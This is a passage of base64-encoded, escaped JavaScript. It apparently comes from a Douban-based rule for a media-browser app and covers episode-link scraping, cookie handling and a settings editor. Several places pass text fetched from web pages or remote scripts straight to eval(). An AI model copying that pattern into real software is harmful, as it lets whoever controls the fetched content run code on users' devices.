uICAgICAgICAgICAgfSkpLmpvaW4oXFxcXFxcXCIsXFxcXFxcXCIpICsgXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIiArIChlLmNvbnRlbnQuc3ViamVjdC5yYXRpbmcgPyBjb21wdXRlUmF0aW5nKGUuY29udGVudC5zdWJqZWN0LnJhdGluZy5tYXgsIGUuY29udGVudC5zdWJqZWN0LnJhdGluZy52YWx1ZSkgKyBcXFxcXFxcIiBcXFxcXFxcIiArIGUuY29udGVudC5zdWJqZWN0LnJhdGluZy52YWx1ZS50b0ZpeGVkKDEpICsgXFxcXFxcXCLliIZcXFxcXFxcIiA6IFxcXFxcXFwi5pqC5peg6K+E5YiGXFxcXFxcXCIpXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgfSkpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIHNldEhvbWVSZXN1bHQoe1xcXFxyXFxcXG4gICAgICAgIGRhdGE6IHBhZ2UgPiAxID8gciA6IGkuY29uY2F0KHIpXFxcXHJcXFxcbiAgICB9KVxcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG5cXFxcclxcXFxuXFxcXHJcXFxcbi8v6KeG6aKR5qih5Z2XXFxcXHJcXFxcbmZ1bmN0aW9uIHZpZGVvVXJsc01vZHVsZShkLCB0eXBlLCBpZCwgY29sLCBsYXp5LCBfcmVzLCBleHRyYSkge1xcXFxyXFxcXG4gICAgLy9jb2zmmK/moLflvI9jb2xbMF0sY29sWzFd5YiG5Yir5pivdHblkoxtb3ZpZeeahOagt+W8jyh0duS8muacieWIhumbhuS/oeaBr3RpdGxl5Lya5b6I6ZW/KVxcXFxyXFxcXG4gICAgaWYgKCFjb2wpIGNvbCA9IFsnaWNvbl8yJywgJ2ljb25fc21hbGxfNCddO1xcXFxyXFxcXG4gICAgaWYgKCFsYXp5KSBsYXp5ID0gJ3JldHVybiBpbnB1dCc7XFxcXHJcXFxcbiAgICBsZXQgcmVzID0gX3JlcyB8fCBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXFxcXFwiICsgdHlwZSArIFxcXFxcXFwiL1xcXFxcXFwiICsgaWQpO1xcXFxyXFxcXG4gICAgZm9yIChsZXQgaXRlbSBpbiByZXMudmVuZG9ycykge1xcXFxyXFxcXG4gICAgICAgIGxldCBlID0gcmVzLnZlbmRvcnNbaXRlbV07XFxcXHJcXFxcbiAgICAgICAgaWYgKHR5cGUgPT09IFxcXFxcXFwidHZcXFxcXFxcIikge1xcXFxyXFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGUudGl0bGUgKyAoZS5lcGlzb2Rlc19pbmZvID8gXFxcXFxcXCLigKJcXFxcXFxcIiArIGUuZXBpc29kZXNfaW5mbyA6IFxcXFxcXFwiXFxcXFxcXCIpLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgaW1nOiBlLmljb24sXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogY29sWzBdIHx8IFxcXFxcXFwiaWNvbl8yXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHk/aWQ9JyArIGlkICsgJyZ0eXBlPScgKyB0eXBlICsgJyZ0aXRsZT0nICsgZS50aXRsZSkucnVsZSgocmVzLCBpZCwgZSwgbGF6eSwgZXh0cmEpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGl0bGUgPSByZXMudGl0bGUsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBpYyA9IHJlcy5waWMubm9ybWFsICsgXFxcXFxcXCJAUmVmZXJlcj1cXFxcXFxcIiArIHJlcy5waWMubm9ybWFsO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHNldFBhZ2VUaXRsZShlLnRpdGxlICsgJy0nICsgdGl0bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHRyeSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHNldFBhZ2VQaWNVcmwocGljKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7fVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdXJscyA9IGdldFR2VXJscyhpZCwgZS5pZCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgbGF6eSA9ICQoXFxcXFxcXCJcXFxcXFxcIikubGF6eVJ1bGUobGF6eSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCByZXN1bHRVcmwgPSBcXFxcXFxcInRvYXN0Oi8v6Kej5p6Q5aSx6LSlXFxcXFxcXCI7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAobGF6eS5zdGFydHNXaXRoKFxcXFxcXFwiKFxcXFxcXFwiKSkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2YWwoJ3Jlc3VsdFVybCA9ICcgKyBsYXp5KVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmFsKCdyZXN1bHRVcmwgPSAnICsgJygoKSA9PiB7JyArIGxhenkgKyAnfSkoKScpXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdFVybFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIH0sIGxhenkpXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGQgPSBbXTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBpZiAodHlwZW9mKHVybHMpID09IFxcXFxcXFwib2JqZWN0XFxcXFxcXCIpIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGQgPSBbXTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCB1cmxzLmxlbmd0aDsgaSsrKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiAn56ysJyArIChpICsgMSkgKyAn6ZuGJyxcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfNCcsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBsYXp5ID8gdXJsc1tpXSArIGxhenkgOiB1cmxzW2ldLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhOiBleHRyYVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBzZXRSZXN1bHQoZCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICh0eXBlb2YodXJscykgPT0gXFxcXFxcXCJzdHJpbmdcXFxcXFxcIiAmJiB1cmxzID09ICfooqvlsIFpcCcpIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSBKU09OLnBhcnNlKHJlcXVlc3QoXFxcXFxcXCJoaWtlcjovL3BhZ2UvcmVsZWFzZUlQP3J1bGU96Z2S6LGGXFxcXFxcXCIpKVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgLnJ1bGU7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGV2YWwocnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICh0eXBlb2YodXJscykgPT0gJ3N0cmluZycgJiYgdXJscyA9PSAn5rKh5pyJ5pS25b2VJykge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZCA9IFtdO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICfosYbnk6PmsqHmnInmlLblvZXmraTop4bpopHmupDnmoTor6bnu4bkv6Hmga8nLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVzYzogJ+eCueaIkeWPr+S7peWOu+inhumikea6kOe9keermeeci+eciycsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBlLnVybFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBzZXRSZXN1bHQoZCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSwgcmVzLCBpZCwgZSwgbGF6eSwgZXh0cmEpXFxcXHJcXFxcbiAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgfSBlbHNlIGlmICh0eXBlID09PSAnbW92aWUnKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCBtTGF6eSA9ICQoXFxcXFxcXCJcXFxcXFxcIikubGF6eVJ1bGUobGF6eSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBsZXQgcmVzdWx0VXJsID0gXFxcXFxcXCJ0b2FzdDovL+ino+aekOWksei0pVxcXFxcXFwiO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdHJ5IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBpZiAobGF6eS5zdGFydHNXaXRoKFxcXFxcXFwiKFxcXFxcXFwiKSkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBldmFsKCdyZXN1bHRVcmwgPSAnICsgbGF6eSlcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBldmFsKCdyZXN1bHRVcmwgPSAnICsgJygoKSA9PiB7JyArIGxhenkgKyAnfSkoKScpXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0VXJsXFxcXHJcXFxcbiAgICAgICAgICAgIH0sIGxhenkpXFxcXHJcXFxcbiAgICAgICAgICAgIGQucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogZS50aXRsZSArIChlLmVwaXNvZGVzX2luZm8gPyBcXFxcXFxcIuKAolxcXFxcXFwiICsgZS5lcGlzb2Rlc19pbmZvIDogXFxcXFxcXCJcXFxcXFxcIiksXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpbWc6IGUuaWNvbixcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBjb2xbMV0gfHwgXFxcXFxcXCJpY29uX3NtYWxsXzRcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogbUxhenkgPyBlLnVybCArIG1MYXp5IDogZS51cmwsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBleHRyYTogZXh0cmFcXFxcclxcXFxuICAgICAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbn1cXFxcclxcXFxuXFxcXHJcXFxcbi8v6I635Y+W55S16KeG5Ymn5YiG6ZuG6ZO+5o6lLGlk5piv54mH5a2Q57yW5Y+3LHVpZOaYr+inhumikea6kOe8luWPt1xcXFxyXFxcXG5mdW5jdGlvbiBnZXRUdlVybHMoaWQsIHVpZCkge1xcXFxyXFxcXG4gICAgbGV0IGNvb2tpZUNhY2hlID0gJ2hpa2VyOi8vZmlsZXMvY2FjaGUvZG91YmFuY29va2llLnR4dCc7XFxcXHJcXFxcbiAgICBsZXQgbVVybCA9ICdodHRwczovL21vdmllLmRvdWJhbi5jb20vc3ViamVjdC8nICsgaWQgKyAnLyc7XFxcXHJcXFxcbiAgICBsZXQgaGVhZGVycyA9IHtcXFxcclxcXFxuICAgICAgICBcXFxcXFxcIlVzZXItQWdlbnRcXFxcXFxcIjogUENfVUEsXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBpZiAoZmlsZUV4aXN0KGNvb2tpZUNhY2hlKSkge1xcXFxyXFxcXG4gICAgICAgIGhlYWRlcnNbXFxcXFxcXCJDb29raWVcXFxcXFxcIl0gPSBmZXRjaChjb29raWVDYWNoZSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIGxldCBodG1sID0gcmVxdWVzdChtVXJsLCB7XFxcXHJcXFxcbiAgICAgICAgaGVhZGVyczogaGVhZGVyc1xcXFxyXFxcXG4gICAgfSlcXFxcclxcXFxuICAgIGlmICgoaHRtbC5pbmNsdWRlcyhcXFxcXFxcIueZu+W9lei3s+i9rFxcXFxcXFwiKSAmJiBodG1sLmluY2x1ZGVzKFxcXFxcXFwi5byC5bi46K+35rGCXFxcXFxcXCIpKSB8fCAoaHRtbC5pbmNsdWRlcyhcXFxcXFxcIndpbmRvdy5sb2NhdGlvbi5ocmVmXFxcXFxcXCIpICYmIGh0bWwuaW5jbHVkZXMoXFxcXFxcXCJzZWMuZG91YmFuXFxcXFxcXCIpKSkge1xcXFxyXFxcXG4gICAgICAgIHJldHVybiAn6KKr5bCBaXAnO1xcXFxyXFxcXG4gICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICBsZXQgcyA9IHtcXFxcclxcXFxuICAgICAgICAgICAgcXE6IDEsXFxcXHJcXFxcbiAgICAgICAgICAgIHlvdWt1OiAzLFxcXFxyXFxcXG4gICAgICAgICAgICBsZXR2OiA2LFxcXFxyXFxcXG4gICAgICAgICAgICBtZ3R2OiA3LFxcXFxyXFxcXG4gICAgICAgICAgICBiaWxpYmlsaTogOCxcXFxcclxcXFxuICAgICAgICAgICAgaXFpeWk6IDksXFxcXHJcXFxcbiAgICAgICAgICAgIGNudHY6IDEyLFxcXFxyXFxcXG4gICAgICAgICAgICBjY3R2NjogMTMsXFxcXHJcXFxcbiAgICAgICAgICAgIG1pZ3V2aWRlbzogMTUsXFxcXHJcXFxcbiAgICAgICAgICAgIHhpZ3VhOiAxNyxcXFxcclxcXFxuICAgICAgICAgICAgYWNmdW46IDE4LFxcXFxyXFxcXG4gICAgICAgICAgICBtYWlkdWlkdWk6IDE5XFxcXHJcXFxcbiAgICAgICAgfTtcXFxcclxcXFxuICAgICAgICBsZXQgbnVtID0gc1t1aWRdO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgICAgICB2YXIgc291cmNlcyA9IHt9O1xcXFxyXFxcXG4gICAgICAgIGxldCBzbCA9IGh0bWwubWF0Y2goL3NvdXJjZXNcXFxcXFxcXFtbMS05XXsxLDJ9XFxcXFxcXFxdW1xcXFxcXFxcc1xcXFxcXFxcU10qP1xcXFxcXFxcXS9nKTtcXFxcclxcXFxuICAgICAgICBpZiAoc2wpIHtcXFxcclxcXFxuICAgICAgICAgICAgZm9yICh2YXIgaSBpbiBzbCkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgZXZhbChzbFtpXSk7XFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICBsZXQgc2NyaXB0X2xpc3QgPSBwYXJzZURvbUZvckFycmF5KGh0bWwsICdib2R5JiZzY3JpcHRbc3JjXScpO1xcXFxyXFxcXG4gICAgICAgICAgICBsZXQgc291cmNlc191cmwgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxyXFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpIGluIHNjcmlwdF9saXN0KSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBsZXQgdXJsID0gcGFyc2VEb21Gb3JIdG1sKHNjcmlwdF9saXN0W2ldLCAnc2NyaXB0JiZzcmMnKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGlmICh1cmwuaW5kZXhPZignbWl4ZWRfc3RhdGljJykgIT09IC0xKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgc291cmNlc191cmwgPSB1cmw7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgbGV0IHNvdXJjZXNfbGlzdCA9IHJlcXVlc3Qoc291cmNlc191cmwpLm1hdGNoKC9zb3VyY2VzXFxcXFxcXFxbWzEtOV17MSwyfVxcXFxcXFxcXVtcXFxcXFxcXHNcXFxcXFxcXFNdKj9cXFxcXFxcXF0vZyk7XFxcXHJcXFxcbiAgICAgICAgICAgIGZvciAodmFyIGkgaW4gc291cmNlc19saXN0KSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBldmFsKHNvdXJjZXNfbGlzdFtpXSk7XFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgICAgIGxldCByZW4gPSBzb3VyY2VzW251bV07XFxcXHJcXFxcbiAgICAgICAgaWYgKHJlbiAmJiByZW4ubGVuZ3RoID4gMCkge1xcXFxyXFxcXG4gICAgICAgICAgICAvKnZhciByID0gcmVuLm1hcChlID0+IHVuZXNjYXBlKGUucGxheV9saW5rLnJlcGxhY2UoLyhodHRwc3xodHRwKTpcXFxcXFxcXC9cXFxcXFxcXC93d3cuZG91YmFuLmNvbVxcXFxcXFxcL2xpbmsyXFxcXFxcXFwvXFxcXFxcXFw/dXJsPS8sICcnKVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgLnNwbGl0KCc7JylbMF0uc3BsaXQoJy5odG1sJylbMF0gKyAnLmh0bWwnKSkqL1xcXFxyXFxcXG4gICAgICAgICAgICB2YXIgciA9IHJlbi5tYXAoZSA9PiB1bmVzY2FwZShlLnBsYXlfbGluay5zcGxpdCgnP3VybD0nKVsxXS5zcGxpdCgnJicpWzBdKSlcXFxcclxcXFxuXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgIHJldHVybiByIHx8ICfmsqHmnInmlLblvZUnO1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6K6+572u6aG1XFxcIixcXFwicGF0aFxcXCI6XFxcInNldHRpbmdQYWdlXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS91dGlscycpKS5ydWxlKTtcXFxcblxcXFxuLy/lvbHniYfor6bmg4XphY3nva7mqKHlnZdcXFxcbmZ1bmN0aW9uIGRldGFpbFZpZXdNb2RlTW9kdWxlKGQsIGRldGFpbHNWaWV3Q29uZmlncykge1xcXFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAn6Ieq5a6a5LmJ5b2x54mH6K+m5oOF6aG16Z2iJy5ib2xkKCksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiXFxcXG4gICAgfSlcXFxcbiAgICBmb3IgKGxldCBjb25maWdLZXkgb2YgT2JqZWN0LmtleXMoZGV0YWlsc1ZpZXdDb25maWdzKSkge1xcXFxuICAgICAgICBpZiAoY29uZmlnS2V5ID09PSAndXNlJykgY29udGludWU7XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogY29uZmlnS2V5ID09PSBkZXRhaWxzVmlld0NvbmZpZ3MudXNlID8gXFxcXFxcXCLigJzigJxcXFxcXFxcIiArIGNvbmZpZ0tleSArIFxcXFxcXFwi4oCd4oCdXFxcXFxcXCIgOiBjb25maWdLZXksXFxcXG4gICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCJoaWtlcjovL2VtcHR5I25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoY29uZmlnS2V5ID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKVxcXFxuICAgICAgICAgICAgICAgIGlmIChjb25maWcuZGV0YWlsc1ZpZXdDb25maWdzLnVzZSA9PT0gY29uZmlnS2V5KSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIC8vcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9jb25maWdfdHlwZVxcXFxcXFwiLCAn5b2x54mH6K+m5oOF6aG16Z2i6YWN572uJylcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9uYW1lXFxcXFxcXCIsIGNvbmZpZ0tleSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiaW5wdXRfY29kZVxcXFxcXFwiLCBjb25maWcuZGV0YWlsc1ZpZXdDb25maWdzW2NvbmZpZ0tleV0uY29uZmlnKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9zZXR0aW5nX2NvZGVcXFxcXFxcIiwgY29uZmlnLmRldGFpbHNWaWV3Q29uZmlnc1tjb25maWdLZXldLnNldHRpbmcgfHwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL3NldHRpbmctZWRpdG9yP3J1bGU96Z2S6LGGJnZpZXc9ZGV0YWlsVmlld01vZGVFZGl0UGFnZSc7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGNvbmZpZy5kZXRhaWxzVmlld0NvbmZpZ3MudXNlID0gY29uZmlnS2V5XFxcXG4gICAgICAgICAgICAgICAgd3JpdGVGaWxlKGdldE15VmFyKCdxZGJfY29uZmlnJyksIEpTT04uc3RyaW5naWZ5KGNvbmZpZykpXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/liIfmjaLmiJDlip8nXFxcXG4gICAgICAgICAgICB9LCBjb25maWdLZXkpLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbidcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgY29sX3R5cGU6ICdibGFua19ibG9jaydcXFxcbiAgICB9KVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAn4p6VJyxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbicsXFxcXG4gICAgICAgIHVybDogJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj9ydWxlPemdkuixhiZ2aWV3PWRldGFpbFZpZXdNb2RlRWRpdFBhZ2UnXFxcXG4gICAgfSk7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfinpYnLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGRldGFpbHNWaWV3Q29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnICYmIGNvbmZpZ0tleSAhPT0gJ+m7mOiupCcpLCAyKVxcXFxuICAgICAgICAgICAgLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0ID09PSAn6buY6K6kJykgcmV0dXJuICd0b2FzdDovL+m7mOiupOmFjee9ruaXoOazleWIoOmZpO+8gSdcXFxcbiAgICAgICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKVxcXFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PT0gY29uZmlnLmRldGFpbHNWaWV3Q29uZmlncy51c2UpIHJldHVybiAndG9hc3Q6Ly/or6XphY3nva7mraPlnKjkvb/nlKjvvIzml6Dms5XliKDpmaTvvIEnXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICQoJ+ehruiupOWIoOmZpFxcXFxcXFwiJyArIGlucHV0ICsgJ1xcXFxcXFwi77yfJykuY29uZmlybSgoY29uZmlnLCBjb25maWdLZXkpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlIGNvbmZpZy5kZXRhaWxzVmlld0NvbmZpZ3NbY29uZmlnS2V5XVxcXFxuICAgICAgICAgICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSlcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5Yig6ZmkJyArIGNvbmZpZ0tleSArICfmiJDlip8nXFxcXG4gICAgICAgICAgICAgICAgfSwgY29uZmlnLCBpbnB1dClcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgfSlcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ/Cfk50nLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGRldGFpbHNWaWV3Q29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnKSwgMikuc2VsZWN0KCgpID0+IHtcXFxcbiAgICAgICAgICAgIC8vIGlmIChpbnB1dCA9PT0gJ+m7mOiupCcpIHJldHVybiAndG9hc3Q6Ly/pu5jorqTphY3nva7ml6Dms5XnvJbovpHvvIEnXFxcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKVxcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9uYW1lXFxcXFxcXCIsIGNvbmZpZ0tleSk7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X2NvZGVcXFxcXFxcIiwgY29uZmlnLmRldGFpbHNWaWV3Q29uZmlnc1tjb25maWdLZXldLmNvbmZpZyk7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X3NldHRpbmdfY29kZVxcXFxcXFwiLCBjb25maWcuZGV0YWlsc1ZpZXdDb25maWdzW2NvbmZpZ0tleV0uc2V0dGluZyB8fCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL3NldHRpbmctZWRpdG9yP3J1bGU96Z2S6LGGJnZpZXc9ZGV0YWlsVmlld01vZGVFZGl0UGFnZSdcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9KVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAn8J+TpScsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCJcXFxcXFxcIiwgXFxcXFxcXCLor7fovpPlhaXlj6Pku6RcXFxcXFxcIikuaW5wdXQoKCkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKCFpbnB1dC5pbmNsdWRlcyhcXFxcXFxcIuW9seeJh+ivpuaDhemhtemdoumFjee9rlxcXFxcXFwiKSkgcmV0dXJuIFxcXFxcXFwidG9hc